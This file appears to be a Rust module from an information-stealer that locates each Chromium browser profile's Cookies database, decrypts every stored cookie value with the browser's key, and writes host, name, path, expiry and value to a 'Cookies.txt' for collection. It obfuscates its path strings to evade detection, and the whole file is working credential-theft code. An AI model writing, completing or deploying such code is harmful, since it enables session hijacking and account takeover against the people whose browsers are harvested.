use crate::alloc::borrow::ToOwned;
use crate::chromium::{BrowserData, decrypt_data};
use crate::{
    Cookie, ExtractExt, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all,
};
use alloc::sync::Arc;
use collector::{Browser, Collector};
use derive_new::new;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

const COOKIES_HOST_KEY: usize = 1;
const COOKIES_NAME: usize = 3;
const COOKIES_ENCRYPTED_VALUE: usize = 5;
const COOKIES_PATH: usize = 6;
const COOKIES_EXPIRES_UTC: usize = 7;

#[derive(new)]
pub(super) struct CookiesTask {
    browser: Arc<BrowserData>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask {
    parent_name!("Cookies.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(cookies) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("Network") / s!("Cookies"),
            s!("Cookies"),
            Cookie::make_extractor((
                COOKIES_HOST_KEY,
                COOKIES_NAME,
                COOKIES_PATH,
                COOKIES_EXPIRES_UTC,
                COOKIES_ENCRYPTED_VALUE,
                |value| decrypt_data(&value.as_blob()?, &self.browser).map(Into::into),
            )),
        ) else {
            return;
        };

        collector.get_browser().increase_cookies_by(cookies.len());
        let _ = to_string_and_write_all(&cookies, "\n", filesystem, parent);
    }
}
